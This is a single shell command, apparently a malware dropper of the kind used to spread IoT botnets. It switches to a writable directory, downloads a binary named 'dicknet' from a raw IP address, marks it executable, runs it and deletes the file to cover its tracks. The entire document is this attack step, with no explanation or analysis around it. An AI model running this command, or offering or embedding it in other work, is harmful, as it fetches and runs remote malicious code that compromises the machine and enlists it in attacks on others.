cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://69.197.185.90/dicknet; chmod +x dicknet; ./dicknet; rm -rf dicknet
